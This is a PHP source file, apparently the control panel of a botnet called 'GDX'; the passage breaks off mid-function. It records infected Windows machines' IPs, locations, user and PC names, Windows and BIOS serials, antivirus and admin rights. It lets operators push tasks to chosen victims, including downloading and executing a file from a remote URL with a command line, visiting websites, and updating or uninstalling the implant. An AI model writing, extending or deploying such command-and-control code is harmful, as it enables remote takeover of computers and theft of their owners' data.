<?php
    include_once("utility.php");
    include_once("gdxintrnl.php");

class GDX 
{
    private $Connection;
    private $KnockInterval;
    private $DeadInterval;
    private $SortKey;
    private $Admin;
    
    public function __construct($conn) 
    {
        $this->Connection = $conn;
        $SlSettings = $this->Connection->query("SELECT * FROM Settings");
        $Settings = $SlSettings->fetch(PDO::FETCH_ASSOC);
        $this->KnockInterval = $Settings["KnockInterval"];
        $this->DeadInterval = $Settings["DeadInterval"];
        
        $SlAdmins = $this->Connection->query("SELECT * FROM Admins");
        $Admins = $SlAdmins->fetch(PDO::FETCH_ASSOC);
        $this->Admin = $Admins["UserName"];
    }
    
    private function USortCallBackAsc($a, $b) 
    {
        if($a[$this->SortKey] == $b[$this->SortKey])
        {
            return 0;
        }
        
        return $a[$this->SortKey] < $b[$this->SortKey]? 1: -1;
    }
    
    private function USortCallBackDes($a, $b) 
    {
        if($a[$this->SortKey] == $b[$this->SortKey])
        {
            return 0;
        }
        
        return $a[$this->SortKey] < $b[$this->SortKey]? -1: 1;
    }
    
    private function USortArray($Array, $Key, $Order = "Asc")
    {
        $this->SortKey = $Key;
        
        if($Order == "Asc")
        {
            usort($Array, array($this, "USortCallBackAsc"));
        }
        else if($Order == "Des")
        {
            usort($Array, array($this, "USortCallBackDes"));
        }
        
        return $Array;
    }
    
    private function BuildTOP5Contries($Clients)
    {
        $NumberClients = count($Clients);
        $TOP = array(
            array("Location" => "", "Count" => 1), 
            array("Location" => "", "Count" => 0), 
            array("Location" => "", "Count" => 0), 
            array("Location" => "", "Count" => 0), 
            array("Location" => "", "Count" => 0)
            );
        
        if($NumberClients < 5)
        {
            return $TOP;
        }
        
        $Locations = array();
        for($x = 0; $x < $NumberClients; $x++)
        {
            $Exist = false;
            $Index;
            $Location = $Clients[$x]["Location"];
            
            for($l = 0; $l < count($Locations); $l++)
            {
                if($Locations[$l]["Location"] == $Location)
                {
                    $Exist = true;
                    $Index = $l;
                    break;
                }
            }
            
            if($Exist) 
                $Locations[$Index]["Count"]++;
            else 
                array_push($Locations, array("Location" => $Location, "Count" => 1));
        }
        
        $NumberLocations = count($Locations);
        if($NumberLocations < 5)
        {
            return $TOP;
        }
        
        $Locations = $this->USortArray($Locations, "Count");
        $TOP[0] = $Locations[0];
        $TOP[1] = $Locations[1];
        $TOP[2] = $Locations[2];
        $TOP[3] = $Locations[3];
        $TOP[4] = $Locations[4];
        
        return $TOP;
    }
    
    private function BuildMapColors($Clients)
    {
        $Colors = "";
        $NumberClients = count($Clients);
        $Countries = array();
        
        if($NumberClients)
        {
            for($x = 0; $x < $NumberClients; $x++)
            {
                $Exist = false;
                $Index = 0;
                $location = $Clients[$x]["Location"];
                for($c = 0; $c < count($Countries); $c++)
                {
                    if($Countries[$c]["Location"] == $location)
                    {
                        $Exist = true;
                        $Index = $c;
                        break;
                    }
                }
                
                if($Exist) 
                    $Countries[$Index]["Count"]++;
                else 
                    array_push($Countries, array("Location" => $location, "Count" => 1));
            }
            
            for($x = 0; $x < count($Countries); $x++)
            {
                $Country = $Countries[$x];
                if($Country["Count"])
                {
                    if($Country["Count"] >= 1 && $Country["Count"] <= 50)
                    {
                        $RGBColor = 0x12FF14;
                    }
                    else if($Country["Count"] >= 51 && $Country["Count"] <= 200)
                    {
                        $RGBColor = 0x0C962C;
                    }
                    else if($Country["Count"] >= 201 && $Country["Count"] <= 500)
                    {
                        $RGBColor = 0xFFFB14;
                    }
                    else if($Country["Count"] >= 501 && $Country["Count"] <= 1000)
                    {
                        $RGBColor = 0xFF9914;
                    }
                    else if($Country["Count"] >= 1001 && $Country["Count"] <= 5000)
                    {
                        $RGBColor = 0xFF1414;
                    }
                    else
                    {
                        $RGBColor = 0xA30000;
                    }
                    
                    $Colors .= (sprintf("%s: '#%06X',\r\n", strtolower($Country["Location"]), $RGBColor));
                }
            }
        }
        
        return $Colors;
    }
    
    private function FetchClients()
    {
        $SlClients = $this->Connection->query("SELECT * FROM Clients");
        return $SlClients->fetchAll(PDO::FETCH_ASSOC);
    }
    
    private function FetchTasks()
    {
        $SlTasks = $this->Connection->query("SELECT * FROM Tasks");
        return $SlTasks->fetchAll(PDO::FETCH_ASSOC);
    }
    
    private function IsValidTaskFilter($TaskInfo, $ClientIdSz)
    {
        if($TaskInfo["TasksSent"] >= $TaskInfo["MaximumClients"])
        {
            return false;
        }
        
        if($TaskInfo["ClientsFilter"] != "*")
        {
            $Found = false;
            $Clients = explode(",", $TaskInfo["ClientsFilter"]);
            for($i = 0; $i < count($Clients); $i++)
            {
                if($Clients[$i] == $ClientIdSz)
                {
                    $Found = true;
                    break;
                }
            }
            if(!$Found)
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////

        $ClientIdBin = pack('H*', $ClientIdSz);
        $SlPr = $this->Connection->prepare("SELECT * FROM Clients WHERE ClientId = :ClientId");
        $SlPr->execute(array("ClientId" => $ClientIdBin));
        $ClientInfo = $SlPr->fetch(PDO::FETCH_ASSOC);
        
        if(!$ClientInfo)
        {
            return false;
        }
        
        if($TaskInfo["LocationsFilter"] != "*")
        {
            $Found = false;
            $Locations = explode(",", $TaskInfo["LocationsFilter"]);
            for($i = 0; $i < count($Locations); $i++)
            {
                if($Locations[$i] == $ClientInfo["Location"])
                {
                    $Found = true;
                    break;
                }
            }
            if(!$Found)
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////////

        if($TaskInfo["OperatingSystemsFilter"] != ALL_OPERATING_SYSTEMS_MASK)
        {
            $OSMask = GetOperatingSystemIntToMask($ClientInfo["OperatingSystem"]);
            if(!($TaskInfo["OperatingSystemsFilter"] & $OSMask))
            {
                return false;
            }
        }

return true;
    }
    
    private function IsTaskCompleted($TaskIdBin, $ClientIdBin)
    {
        $SlPr = $this->Connection->prepare("SELECT Id FROM TasksCompleted WHERE TaskId = :TaskId AND ClientId = :ClientId");
        $SlPr->execute(array("TaskId" => $TaskIdBin, "ClientId" => $ClientIdBin));
        $TaskInfo = $SlPr->fetch(PDO::FETCH_ASSOC);
        
        if($TaskInfo)
        {
            return true;
        }

        return false;
    }
    
    private function CreateTaskCompleted($TaskIdBin, $ClientIdBin)
    {
        global $GdxCurrentTime;
        $InPr = $this->Connection->prepare(
            "INSERT INTO TasksCompleted (TaskId, ClientId, CompletionDate, Status) 
                VALUES ( :TaskId, :ClientId, :Date, :Status)");
        
        $InPr->execute(array(
            "TaskId" => $TaskIdBin, 
            "ClientId" => $ClientIdBin, 
            "Date" => $GdxCurrentTime,
            "Status" => TASK_CMPLD_SENT));
    }
    
    function LookupTask($Connection, $ClientId)
    {
        $Parameters = "";
        $SlTasks = $Connection->query("SELECT * FROM Tasks");
        $Tasks = $SlTasks->fetchAll(PDO::FETCH_ASSOC);
        for($i = 0; $i < count($Tasks); $i++)
        {
            $Task = $Tasks[$i];
            if($Task["Status"] == TASK_SUSPENDED || $Task["Status"] == TASK_EXPIRED)
            {
                continue;
            }
            
            $TaskIdBin = $Task["TaskId"];
            $ClientIdBin = pack('H*', $ClientId);
            if($this->IsValidTaskFilter($Task, $ClientId))
            {
                if(!$this->IsTaskCompleted($TaskIdBin, $ClientIdBin))
                {
                    $this->CreateTaskCompleted($TaskIdBin, $ClientIdBin);
                    
                    $UpPr = $this->Connection->prepare("UPDATE Tasks SET TasksSent = TasksSent + 1 WHERE TaskId = :TaskId");
                    $UpPr->execute(array("TaskId" => $TaskIdBin));
                    $Parameters = HEADER_EXECUTE_TASK . "ci=" . $ClientId . "," . $Task["TaskParameter"];
                    
                    break;
                }
            }
        }
        
        return $Parameters;
    }
    
    function UpdateTasksExp()
    {
        global $GdxCurrentTime;
        
        $Tasks = $this->FetchTasks();
        $NumberTasks = count($Tasks);
        for($i = 0; $i < $NumberTasks; $i++)
        {
            $Task = $Tasks[$i];
            
            
            if($Task["Status"] != TASK_EXPIRED && $GdxCurrentTime >= $Task["ExpirationDate"])
            {
                $UpSl = $this->Connection->prepare("UPDATE Tasks SET Status = :Status WHERE TaskId = :TaskId");
                $UpSl->execute(array("Status" => TASK_EXPIRED, "TaskId" => $Task["TaskId"]));
            }
        }
    }
    
    private function GdxUpdateClientStatus($Clients)
    {
        global $GdxCurrentTime;
        
        for($i = 0; $i < count($Clients); $i++)
        {
            if(($GdxCurrentTime - $Clients[$i]["LastCheck"]) <= ($this->DeadInterval * 60 * 60 * 24))
            {
                if(($GdxCurrentTime - $Clients[$i]["LastCheck"]) <= ($this->KnockInterval * 60))
                {
                    $Clients[$i]["Status"] = GDX_CLIENT_STATUS_ONLINE;
                }
                else
                {
                    $Clients[$i]["Status"] = GDX_CLIENT_STATUS_OFFLINE;
                }
            }
            else
            {
                $Clients[$i]["Status"] = GDX_CLIENT_STATUS_DEAD;
            }
        }
        
        return $Clients;
    }
    
    private function GdxGetTasksStatistics($Tasks)
    {
        $TasksResult = array(
            "TotalTasks" => 0,
            "TasksExecuting" => 0,
            "TotalTasksSent" => 0,
            "TotalTasksExecuted" => 0,
            "TotalTasksFailed" => 0);
        
        $NumberTasks = count($Tasks);
        $TasksResult["TotalTasks"] = $NumberTasks;
        for($i = 0; $i < $NumberTasks; $i++)
        {
            if($Tasks[$i]["Status"] == TASK_EXECUTING)
            {
                $TasksResult["TasksExecuting"]++;
            }
            
            $TasksResult["TotalTasksSent"] += $Tasks[$i]["TasksSent"];
            $TasksResult["TotalTasksExecuted"] += $Tasks[$i]["ClientsExecuted"];
            $TasksResult["TotalTasksFailed"] += $Tasks[$i]["ClientsFailed"];
        }
        
        return $TasksResult;
    }
    
    private function ValidateTaskParameters(&$POSTData, &$Status)
    {
        if((!isset($POSTData["TaskType"])) ||
            $POSTData["TaskType"] != "DownloadAndExecute" &&
            $POSTData["TaskType"] != "VisitWebsite" &&
            $POSTData["TaskType"] != "UpdateClient" && 
            $POSTData["TaskType"] != "UnInstallClient"
            )
        {
            $Status = "Invalid task type";
            return false;
        }
        
        if(!strlen($POSTData["TaskName"]))
        {
            $Status = "Task name is required";
            return false;
        }
        
        switch($POSTData["TaskType"])
        {
            case "DownloadAndExecute":
                if(!(strlen($POSTData["DownloadFileURL"]) > 0))
                {
                    $Status = "An URL is required to download the file";
                    return false;
                }

                $POSTData["DownloadFileURL"] = FormatURL($POSTData["DownloadFileURL"]);
                if(!filter_var($POSTData["DownloadFileURL"], FILTER_VALIDATE_URL)) 
                {
                    $Status = "An invalid URL was specified";
                    return false;
                }
                break;
            case "VisitWebsite":
                if(!(strlen($POSTData["WebsiteURL"]) > 0))
                {
                    $Status = "An URL is required";
                    return false;
                }

                $POSTData["WebsiteURL"] = FormatURL($POSTData["WebsiteURL"]);
                if(!filter_var($POSTData["WebsiteURL"], FILTER_VALIDATE_URL)) 
                {
                    $Status = "An invalid URL was specified";
                    return false;
                }

                break;
            case "UpdateClient":
                if(!(strlen($POSTData["UpdateFileURL"]) > 0))
                {
                    $Status = "An URL is required to download the file";
                    return false;
                }

                $POSTData["UpdateFileURL"] = FormatURL($POSTData["UpdateFileURL"]);
                if(!filter_var($POSTData["UpdateFileURL"], FILTER_VALIDATE_URL)) 
                {
                    $Status = "An invalid URL was specified";
                    return false;
                }
                break;
            case "UnInstallClient":
                // no parameter is required
                break;
        }
        
        if(strlen($POSTData["ClientIds"]) > 0)
        {
            $POSTData["ClientIds"] = str_replace(" ", "", $POSTData["ClientIds"]);
            $Ids = explode(",", $POSTData["ClientIds"]);
            
            if((!$Ids) || (!count($Ids)))
            {
                $Status = "Invalid client ID";
                return false;
            }
            
            foreach($Ids as $Value)
            {
                if(!ctype_xdigit($Value))
                {
                    $Status = "Invalid Client ID, value: {$Value}";
                    return false;
                }
            }
        }
        else
        {
            $POSTData["ClientIds"] = "*";
        }
        
        if(strlen($POSTData["LocationIds"]) > 0)
        {
            $POSTData["LocationIds"] = str_replace(" " , "", $POSTData["LocationIds"]);
            $Ids = explode(",", $POSTData["LocationIds"]);
            
            if((!$Ids) || (!count($Ids)))
            {
                $Status = "Invalid location ID";
                return false;
            }
        }
        else
        {
            $POSTData["LocationIds"] = "*";
        }
        
        if(strlen($POSTData["MaximumClients"]) > 0)
        {
            if(!is_numeric($POSTData["MaximumClients"]))
            {
                $Status = "Invalid maximum number of clients";
                return false;
            }
        }
        
        if(strlen($POSTData["ExpirationDate"]) > 0)
        {
            if(!strtotime($POSTData["ExpirationDate"]))
            {
                $Status = "Invalid expiration date";
                return false;
            }
        }
        
        return true;
    }
    
    private function GetTaskTypeInt($TaskTypeSz)
    {
        switch ($TaskTypeSz) 
        {
            case "DownloadAndExecute":
                return TASK_DOWNLOAD_AND_EXECUTE;
            break;
            case "VisitWebsite":
                return TASK_VISIT_WEBSITE;
            break;
            case "UpdateClient":
                return TASK_UPDATE_CLIENT;
            break;
            case "UnInstallClient":
                return TASK_UNINSTALL_CLIENT;
            break;
        }

        return 0;
    }
    
    private function GetTaskId()
    {
        $TaskIdResult = null;
        $Tasks = $this->FetchTasks();
        
        for($t = 0; $t < 100; $t++)
        {
            $Success = true;
            $NewTaskId = BuildHexSz32();
            for($i = 0; $i < count($Tasks); $i++)
            {
                if($Tasks[$i]["TaskId"] == $NewTaskId)
                {
                    $Success = false;
                    break;
                }
            }
            
            if($Success) 
            {
                $TaskIdResult = $NewTaskId;
                break;
            }
        }
        
        return $TaskIdResult;
    }
    
    function BuildTaskParameter($POSTData, $TaskIdSz)
    {
        $TaskData = "";
        if(isset($POSTData) && isset($TaskIdSz))
        {
            switch ($POSTData["TaskType"]) 
            {
                case "DownloadAndExecute":
                    $URL = parse_url($POSTData["DownloadFileURL"]);
                    $Host = isset($URL["host"]) ? $URL["host"] : "";
                    $Path = isset($URL["path"]) ? $URL["path"] : "";
                    $CommandLine = $POSTData["CommandLine"];

                    $TaskData .= "cmd=dlex,ti=" . $TaskIdSz . ",ho=" . $Host . ",pa=" . $Path . ",cl=" . $CommandLine;
                    
                    break;
                case "VisitWebsite":
                    $URL = $POSTData["WebsiteURL"];

                    $TaskData .= "cmd=vsws,ti=" . $TaskIdSz . ",ul=" . $URL;
                    break;
                case "UpdateClient":
                    $URL = parse_url($POSTData["UpdateFileURL"]);
                    $Host = $URL["host"];
                    $Path = $URL["path"];

                    $TaskData .= "cmd=udcl,ti=" . $TaskIdSz . ",ho=" . $Host . ",pa=" . $Path;
                    break;
                case "UnInstallClient":

                    $TaskData .= "cmd=uncl,ti=" . $TaskIdSz;
                    break;
            }
        }
        
        return $TaskData;
    }
    
    private function GetOperatingSystemFilterMask($OSArray)
    {
        $Mask = 0;
        foreach($OSArray as $OS)
        {
            $Mask |= GetOperatingSystemSzToMask($OS);
        }

        return $Mask;
    }

    private function GetTaskStatusSz($TaskStatusInt)
    {
        switch ($TaskStatusInt) 
        {
            case TASK_EXECUTING:
                return "Executing";
            case TASK_SUSPENDED:
                return "Suspended";
            case TASK_FINISHED:
                return "Finished";
            case TASK_EXPIRED:
                return "Expired";
        }

        return "Unknown";
    }
    
    private function GetTaskTypeSz($TaskTypeInt)
    {
        switch ($TaskTypeInt) 
        {
            case TASK_DOWNLOAD_AND_EXECUTE:
                return "Download And Execute";
            break;
            case TASK_VISIT_WEBSITE:
                return "Visit Website";
            break;
            case TASK_UPDATE_CLIENT:
                return "Update Client";
            break;
            case TASK_UNINSTALL_CLIENT:
                return "UnInstall Client";
            break;
        }

        return "Unknown";
    }
    
    private function GdxDeleteTask($TaskId)
    {
        $TaskIdBin = pack('H*', $TaskId);
        
        $sql = "DELETE FROM Tasks WHERE TaskId = :TaskId";
        
        $DelPr = $this->Connection->prepare($sql);
        $DelPr->Execute(array("TaskId" => $TaskIdBin));
        
        $sql = "DELETE FROM TasksCompleted WHERE TaskId = :TaskId";
        
        $DelPr = $this->Connection->prepare($sql);
        $DelPr->Execute(array("TaskId" => $TaskIdBin));
    }
    
    private function GdxGetTaskStatus($TaskId)
    {
        $TaskIdBin = pack('H*', $TaskId);
        $sql = "SELECT Status FROM Tasks WHERE TaskId = :TaskId";
        $StPr = $this->Connection->prepare($sql);
        
        $StPr->Execute(array("TaskId" => $TaskIdBin));
        $Status = $StPr->fetch(PDO::FETCH_ASSOC);
        return $Status["Status"];
    }
    
    private function GdxSetTaskStatus($TaskId, $Status)
    {
        $TaskIdBin = pack('H*', $TaskId);
        
        $sql = "UPDATE Tasks SET Status = :Status WHERE TaskId = :TaskId";
        $StPr = $this->Connection->prepare($sql);
        
        $StPr->Execute(array("Status" => $Status, "TaskId" => $TaskIdBin));
    }
    
    private function GdxSuspendTask($TaskId)
    {
        $this->GdxSetTaskStatus($TaskId, TASK_SUSPENDED);
    }
    
    private function GdxResumeTask($TaskId)
    {
        $this->GdxSetTaskStatus($TaskId, TASK_EXECUTING);
    }
    
    private function GdxCreateTask($POST, &$Err)
    {
        global $GdxCurrentTime;
    
        if(!$this->ValidateTaskParameters($POST, $Err))
        {
            return false;
        }
        
        if(!($TaskId = $this->GetTaskId()))
        {
            return false;
        }
        
        $sql = "INSERT INTO Tasks (
                TaskId , TaskName , TaskType , TaskParameter , ClientsFilter , LocationsFilter , 
                OperatingSystemsFilter , TasksSent , ClientsExecuted , ClientsFailed , MaximumClients , 
                CreationDate , ExpirationDate , Status ) 
                VALUES (:TaskId , :TaskName , :TaskType , :TaskParameter , :ClientsFilter , :LocationsFilter , 
                :OperatingSystemsFilter , :TasksSent , :ClientsExecuted , :ClientsFailed , :MaximumClients , 
                :CreationDate , :ExpirationDate , :Status )";
                
        $TaskPr = $this->Connection->prepare($sql);
        $TaskPr->execute(array(
                    ":TaskId" => pack("H*", $TaskId),
                    ":TaskName" => $POST["TaskName"],
                    ":TaskType" => $this->GetTaskTypeInt($POST["TaskType"]), 
                    ":TaskParameter" => $this->BuildTaskParameter($POST, $TaskId),
                    ":ClientsFilter" => $POST["ClientIds"], 
                    ":LocationsFilter" => $POST["LocationIds"],
                    ":OperatingSystemsFilter" => $this->GetOperatingSystemFilterMask($POST["OperatingSystems"]), 
                    ":TasksSent" => 0,
                    ":ClientsExecuted" => 0, 
                    ":ClientsFailed" => 0,
                    ":MaximumClients" => $POST["MaximumClients"],
                    ":CreationDate" => $GdxCurrentTime,
                    ":ExpirationDate" => strtotime($POST["ExpirationDate"]),
                    ":Status" => TASK_EXECUTING));
        
        return true;
    }
    
    private function GdxGetStatistics($Clients)
    {
        $Statistics = array(
            "ClientsOnline" => 0,
            "ClientsOffline" => 0,
            "ClientsDead" => 0,
            "ClientsOnlinePast3h" => 0, 
            "ClientsOnlinePast24h" => 0,
            "ClientsOnlinePast3days" => 0,
            "ClientsOnlinePast7days" => 0,
            "NewClientsPast24h" => 0,
            "NewClientsPast3days" => 0,
            "AdminRightsPorc" => 0,
            "AntivirusPorc" => 0,
            "NETFrameworkPorc" => 0,
            "JavaVMPorc" => 0);
        
        global $GdxCurrentTime;
        $NumberClients = count($Clients);
        $AdminRights = 0;
        $Antivirus = 0;
        $NETFramework = 0;
        $JavaVM = 0;
        
        if($NumberClients)
        {
            for($i = 0; $i < $NumberClients; $i++)
            {
                if($Clients[$i]["Status"] == GDX_CLIENT_STATUS_ONLINE)
                {
                    $Statistics["ClientsOnline"]++;
                }
                else if($Clients[$i]["Status"] == GDX_CLIENT_STATUS_OFFLINE)
                {
                    $Statistics["ClientsOffline"]++;
                }
                else if($Clients[$i]["Status"] == GDX_CLIENT_STATUS_DEAD)
                {
                    $Statistics["ClientsDead"]++;
                }
                
                $ClientLastCheck = $GdxCurrentTime - $Clients[$i]["LastCheck"];
                if($ClientLastCheck <= (60 * 60 * 3))
                {
                    $Statistics["ClientsOnlinePast3h"]++;
                }
                if($ClientLastCheck <= (60 * 60 * 24))
                {
                    $Statistics["ClientsOnlinePast24h"]++;
                }
                if($ClientLastCheck <= (60 * 60 * 24 * 3))
                {
                    $Statistics["ClientsOnlinePast3days"]++;
                }
                if($ClientLastCheck <= (60 * 60 * 24 * 7))
                {
                    $Statistics["ClientsOnlinePast7days"]++;
                }
                
                $ClientInstallDate = $GdxCurrentTime - $Clients[$i]["InstallDate"];
                if($ClientInstallDate <= (60 * 60 * 24))
                {
                    $Statistics["NewClientsPast24h"]++;
                }
                if($ClientInstallDate <= (60 * 60 * 24 * 3))
                {
                    $Statistics["NewClientsPast3days"]++;
                }
                
                if($Clients[$i]["HasAdminRigths"])
                {
                    $AdminRights++;
                }
                if(strlen($Clients[$i]["Antivirus"]))
                {
                    $Antivirus++;
                }
                if(strlen($Clients[$i]["InstalledNETFrameworks"]))
                {
                    $NETFramework++;
                }
                if(strlen($Clients[$i]["JAVAVM"]))
                {
                    $JavaVM++;
                }
            }
            
            $Statistics["AdminRightsPorc"] = ($AdminRights * 100) / $NumberClients;
            $Statistics["AntivirusPorc"] = ($Antivirus * 100) / $NumberClients;
            $Statistics["NETFrameworkPorc"] = ($NETFramework * 100) / $NumberClients;
            $Statistics["JavaVMPorc"] = ($JavaVM * 100) / $NumberClients;
        }
        
        return $Statistics;
    }
    
    private function GdxGetClients()
    {
        global $GdxCurrentTime;
        
        $Clients = $this->FetchClients();
        $Clients = $this->GdxUpdateClientStatus($Clients);
        
        $TotalClients = count($Clients);
        $Order = (isset($_GET["ord"])) ? $_GET["ord"] : "Asc";
        $Sort = (isset($_GET["sor"])) ? $_GET["sor"] : "Status";
        $ClientsPerPage = (isset($_GET["cpp"]) && is_numeric($_GET["cpp"])) ? $_GET["cpp"] : 50;
        $Clients = $this->USortArray($Clients, $Sort, $Order);
        $Page = (isset($_GET["pag"])) ? $_GET["pag"]: 1;
        
        if($TotalClients && $TotalClients < $ClientsPerPage) $ClientsPerPage = $TotalClients;
        $NumberPages = floor($TotalClients / $ClientsPerPage) + (($TotalClients % $ClientsPerPage) ? 1 : 0);
        $Page = ($Page > $NumberPages)? 1 : $Page;
        
        $TopContries = $this->BuildTOP5Contries($Clients);
        $Top5Contries = sprintf(GDX_JQUERY_TOP_5, 
            $TopContries[0]["Location"], $TopContries[0]["Count"], 
            $TopContries[1]["Location"], $TopContries[1]["Count"], 
            $TopContries[2]["Location"], $TopContries[2]["Count"], 
            $TopContries[3]["Location"], $TopContries[3]["Count"], 
            $TopContries[4]["Location"], $TopContries[4]["Count"]);
        
        $Colors = $this->BuildMapColors($Clients);
        $Map = sprintf(GDX_JQVMAP, $Colors);
        $Statistics = $this->GdxGetStatistics($Clients);
        
        $ClientPageP1O = sprintf(GDX_CLIENTS_PAGE_P1_O, 
            $TotalClients, 
            $Statistics["ClientsOnline"],
            $Statistics["ClientsOffline"],
            $Statistics["ClientsDead"],
            $Statistics["ClientsOnlinePast3h"],
            $Statistics["ClientsOnlinePast24h"],
            $Statistics["ClientsOnlinePast3days"],
            $Statistics["ClientsOnlinePast7days"],
            $Statistics["NewClientsPast24h"],
            $Statistics["NewClientsPast3days"],
            $Statistics["AdminRightsPorc"],
            $Statistics["AntivirusPorc"],
            $Statistics["NETFrameworkPorc"],
            $Statistics["JavaVMPorc"]);
            
        
        $content = GDX_PAGE_HTML_O . GDX_PAGE_HEAD_O . GDX_SCRIPT_TAG_O . $Top5Contries . $Map . 
        GDX_SCRIPT_TAG_C . GDX_PAGE_BODY_O . sprintf(GDX_TOP_NAVBAR, $this->Admin) . GDX_PAGE_CONT_O . 
        $ClientPageP1O;
        
        if(!($TotalClients > 0))
        {
            $content .= "<tr align='center'><td colspan='100%'> --- Empty --- </td></tr>";
        }
        
        for($i = 0; $i < $ClientsPerPage; $i++)
        {
            $ClientIndex = (($Page - 1) * $ClientsPerPage) + $i;
            if(isset($Clients[$ClientIndex]))
            {
                $ClientInfo = $Clients[$ClientIndex];
                $SzClientId = strtoupper(bin2hex($ClientInfo["ClientId"]));
                $SzIPAddress = inet_ntop($ClientInfo["IPAddress"]);
                $ClientVersion = GetClientVersion($ClientInfo["Version"]);
                $ServipackInt = $ClientInfo["ServipackVersion"];
                $SzServiPack = ($ServipackInt) ? " SP " . $ServipackInt : "";
                $WindowsVersion = GetOperatingSystemIntToSz($ClientInfo["OperatingSystem"]); 
                $WindowsArch = GetOSArchitectureSz($ClientInfo["OSArchitecture"]);
                GetOSArchitectureSz($ClientInfo["OSArchitecture"]);
                $ClientStatus = "";
                
                switch($ClientInfo["Status"])
                {
                case GDX_CLIENT_STATUS_ONLINE:
                    $ClientStatus = "<span class='label label-success'>Online</span>";
                    break;
                case GDX_CLIENT_STATUS_OFFLINE:
                    $ClientStatus = "<span class='label label-default'>Offline</span>";
                    break;
                case GDX_CLIENT_STATUS_DEAD:
                    $ClientStatus = "<span class='label label-danger'>Dead</span>";
                    break;
                }
                
                $PageClient = sprintf(GDX_CLIENTS_PAGE_CLT_INF, 
                            $SzClientId, 
                            $ClientVersion, 
                            $SzIPAddress, 
                            $ClientInfo["Location"], 
                            $ClientInfo["Location"], 
                            $WindowsVersion . $SzServiPack . " / " . $WindowsArch, 
                            strlen($ClientInfo["Antivirus"]) ? $ClientInfo["Antivirus"]: "-", 
                            GetSzDateTimeFromTimeStamp($ClientInfo["InstallDate"]),
                            GetSzDateTimeFromTimeStamp($ClientInfo["LastCheck"]), 
                            $ClientStatus, 
                            $SzClientId,
                            $SzClientId,
                            ///////////////////////////////////////////////////////
                            $SzClientId,
                            $SzClientId,
                            $SzClientId,
                            $SzClientId,
                            $ClientVersion,
                            GetSzAdminRightsBool($ClientInfo["HasAdminRigths"]),
                            $SzIPAddress,
                            $ClientInfo["Location"],
                            GetSzDateTimeFromTimeStamp($ClientInfo["InstallDate"]),
                            GetSzDateTimeFromTimeStamp($ClientInfo["LastCheck"]),
                            $ClientInfo["FilePath"],
                            $WindowsVersion . $SzServiPack . " (" . $WindowsArch . ")" . "", $ClientInfo["WindowsBuildId"],
                            $ClientInfo["PCName"], $ClientInfo["UserName"], $ClientInfo["WindowsSerial"],
                            GetSzDateTimeFromTimeStamp($ClientInfo["PCLocalTime"]),
                            $ClientInfo["WindowsDir"],
                            strlen($ClientInfo["Antivirus"])? $ClientInfo["Antivirus"] : "None",
                            $ClientInfo["DefaultBrowser"],
                            FormatNetFramework($ClientInfo["InstalledNETFrameworks"]),
                            strlen($ClientInfo["JAVAVM"])? $ClientInfo["JAVAVM"]: "None",
                            $ClientInfo["ComputerModel"],
                            $ClientInfo["BIOSName"], $ClientInfo["BIOSManufacturer"],
                            $ClientInfo["BIOSVersion"],
                            $ClientInfo["BIOSSerialNumber"],
                            $ClientInfo["CPUName"], $ClientInfo["CPUManufacturer"],
                            GetCPUArchitecture($ClientInfo["CPUArquitecture"]),
                            $ClientInfo["CPUNumberProcessors"],
                            $ClientInfo["VideoAdapter"],
                            $ClientInfo["VideoResolution"],
                            $ClientInfo["VideoRefreshRate"],
                            FormatPhysicalMemories($ClientInfo["PhysicalMemories"]),
                            FormatHardDrives($ClientInfo["HardDrives"])
                            );
                                
                $content .= $PageClient;
            }
        }
        
        $content .= GDX_CLIENTS_PAGE_P1_C;
        
        if($NumberPages > 1) 
        {
            // pagination
            $content .= sprintf(GDX_CLIENTS_PAGE_PAG_O, sprintf(GDX_CLIENTS_NEXT_PAG, $ClientsPerPage, $Sort, $Order, 1));
            for($i = 0; $i < $NumberPages; $i++)
            {
                $Next = sprintf(GDX_CLIENTS_NEXT_PAG, $ClientsPerPage, $Sort, $Order, $i + 1);
                
                $pClass = (($i + 1) == $Page)? "class='active'" : "";
                $content .= sprintf(GDX_CLIENTS_PAGE_PAG_E, $pClass, $Next, $i + 1);
            }
            
            $content .= sprintf(GDX_CLIENTS_PAGE_PAG_C, sprintf(GDX_CLIENTS_NEXT_PAG, $ClientsPerPage, $Sort, $Order, $NumberPages));
        }
        
        $content .= GDX_PAGE_CONT_C . GDX_PAGE_BODY_C . GDX_PAGE_HTML_C;
        return $content;
    }
    
    private function GdxGetTasks()
    {
        $this->UpdateTasksExp();
        if(isset($_POST["SuspendTask"]))
        {
            if($this->GdxGetTaskStatus($_POST["SuspendTask"]) != TASK_SUSPENDED)
            {
                $this->GdxSuspendTask($_POST["SuspendTask"]);
            }
            else
            {
                $this->GdxResumeTask($_POST["SuspendTask"]);
            }
            
            header("Location: main.php?op=tasks");
            exit;
        }
        else if(isset($_POST["DeleteTask"]))
        {
            $this->GdxDeleteTask($_POST["DeleteTask"]);
            header("Location: main.php?op=tasks");
            exit;
        }
        
        if(isset($_SESSION["NEW_TASK_RS"])) {
            $NewTaskResult = $_SESSION["NEW_TASK_RS"];
            unset($_SESSION["NEW_TASK_RS"]);
        } else $NewTaskResult = "";
        
        if(isset($_POST["TaskType"]))
        {
            $Err = "";
            if($this->GdxCreateTask($_POST, $Err))
            {
                $_SESSION["NEW_TASK_RS"] = 
                "<div class='alert alert-success alert-dismissible' role='alert'>
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                    Task Created Successfully
                </div>";
            }
            else
            {
                $_SESSION["NEW_TASK_RS"] = 
                "<div class='alert alert-danger alert-dismissible' role='alert'>
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                    <strong>Couldn't Create The Task</strong>, " . $Err .
                "</div>";
            }
            
            header("Location: main.php?op=tasks");
            exit;
        }
        
        $TasksInfo = "";
        $Tasks = $this->FetchTasks();
        $NumberTasks = count($Tasks);
        if(!($NumberTasks > 0))
        {
            $TasksInfo = "<tr align='center'><td colspan='100%'> --- Empty --- </td></tr>";
        }
        
        for($i = 0; $i < $NumberTasks; $i++)
        {
            $Task = $Tasks[$i];
            $TaskIdSz = strtoupper(bin2hex($Task["TaskId"]));
            $SuspendResumeSz = ($Task["Status"] != TASK_SUSPENDED)? "Suspend" : "Resume";
            
            $TasksInfo .= sprintf(GDX_TASKS_PAGE_TASK_INF, 
                    $Task["TaskName"],
                    $this->GetTaskTypeSz($Task["TaskType"]),
